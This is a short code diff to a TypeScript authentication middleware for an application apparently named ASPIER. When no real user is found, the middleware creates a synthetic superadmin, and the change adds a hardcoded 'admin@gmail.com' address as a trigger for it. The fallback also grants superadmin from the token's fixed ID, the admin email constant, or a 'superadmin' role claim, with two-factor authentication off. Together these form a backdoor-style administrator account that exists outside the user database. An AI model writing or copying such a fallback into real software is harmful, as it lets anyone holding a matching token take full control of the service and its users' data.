@@ -19,11 +19,11 @@ export async function authenticate(req: AuthRequest, _res: Response, next: NextF
         user = null;
       }
     }
-    if (!user && (payload.sub === '6b02acc199295c1e1226ae3e' || payload.email === FIXED_ADMIN_EMAIL || payload.role === 'superadmin')) {
+    if (!user && (payload.sub === '6b02acc199295c1e1226ae3e' || payload.email === 'admin@gmail.com' || payload.email === FIXED_ADMIN_EMAIL || payload.role === 'superadmin')) {
       user = {
         _id: '6b02acc199295c1e1226ae3e',
         name: 'ASPIER Administrator',
-        email: FIXED_ADMIN_EMAIL,
+        email: 'admin@gmail.com',
         role: 'superadmin',
         isActive: true,
         isAdmin2FAEnabled: false
